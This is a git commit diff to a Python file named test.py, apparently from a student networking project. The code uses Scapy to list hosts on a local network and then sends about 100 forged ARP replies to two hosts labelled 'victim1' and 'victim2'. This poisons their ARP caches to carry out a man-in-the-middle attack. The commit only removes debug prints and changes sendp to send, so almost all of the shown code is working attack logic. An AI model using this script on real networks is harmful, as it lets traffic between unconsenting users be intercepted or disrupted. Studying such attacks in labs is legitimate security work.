eb06c26ea6239e5d589edcefdd0d30b7c2553b14
ahugo <hugo.andriamampianina@ynov.com>
2022-11-07 17:23:46 +0100

    .\test.py

--- test.py
+++ test.py
@@ -14,9 +14,6 @@ for i in range(len(IP_MAC_responses)):
     MAC_on_network.append(IP_MAC_responses[i][1].hwsrc) #to extract MAC
     IP_on_network.append(IP_MAC_responses[i][1].psrc) #to extract IP
 
-print(MAC_on_network    )
-print(IP_on_network)
-
 victim1_IP = IP_on_network[1]
 victim1_MAC = MAC_on_network[1]
 
@@ -26,9 +23,9 @@ victim2_MAC = MAC_on_network[2]
 nb_packets = 0
 while nb_packets < 100:
     spoof_arp_victim1 = ARP(op=2, psrc=victim2_IP, hwdst=victim1_MAC, pdst=victim1_IP)
-    send_spoof1 = sendp(spoof_arp_victim1, verbose = False)
+    send_spoof1 = send(spoof_arp_victim1)
     spoof_arp_victim2 = ARP(op=2, psrc=victim1_IP, hwdst=victim2_MAC, pdst=victim2_IP)
-    send_spoof2 = sendp(spoof_arp_victim2, verbose = False)
+    send_spoof2 = send(spoof_arp_victim2)
     nb_packets += 2
 
 print(nb_packets)
